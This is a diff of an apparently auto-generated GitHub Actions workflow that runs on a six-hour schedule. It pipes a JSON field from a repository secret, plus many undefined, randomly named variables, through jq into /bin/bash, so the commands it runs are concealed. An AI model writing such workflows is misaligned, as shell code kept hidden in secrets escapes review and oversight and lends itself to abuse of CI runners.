@@ -3,28 +3,25 @@ name: gonghanlu6721
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 5/6 * * *'
+    - cron: '25 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gonghanlu6721
         env:
-          wapg95: ${{ secrets.wapg95 }}
+          cgffa395: ${{ secrets.cgffa395 }}
         run: |
-          echo $wapg95 | jq -r .nuoko16 | /bin/bash
-          echo $oab0259 | jq -r .jp0036 | /bin/bash
-          echo $hj296 | jq -r .w81768 | /bin/bash
-          echo $vq2 | jq -r .hbhvx03409 | /bin/bash
-          echo $g7709 | jq -r .b53122 | /bin/bash
-          echo $syvtd3 | jq -r .jegtp5118 | /bin/bash
-          echo $vfwey87 | jq -r .cji468 | /bin/bash
-          echo $f64 | jq -r .iwud870 | /bin/bash
-          echo $guqyl752 | jq -r .qlep56 | /bin/bash
-          echo $v6666 | jq -r .ldzb0 | /bin/bash
-          echo $cwdxu6 | jq -r .lo8 | /bin/bash
-          echo $yx6717 | jq -r .huulz489 | /bin/bash
-          echo $m9 | jq -r .hzxar939 | /bin/bash
-          echo $uopz4496 | jq -r .l5 | /bin/bash
+          echo $cgffa395 | jq -r .mxws41 | /bin/bash
+          echo $vseh00 | jq -r .f6 | /bin/bash
+          echo $ju96874 | jq -r .zrwf3 | /bin/bash
+          echo $qm14192 | jq -r .jdqp2970 | /bin/bash
+          echo $xpaue931 | jq -r .dhtwu55 | /bin/bash
+          echo $sqi2338 | jq -r .awkc891 | /bin/bash
+          echo $oq58051 | jq -r .plqpq61 | /bin/bash
+          echo $m399 | jq -r .n19637 | /bin/bash
+          echo $zrh61608 | jq -r .hwr274 | /bin/bash
 
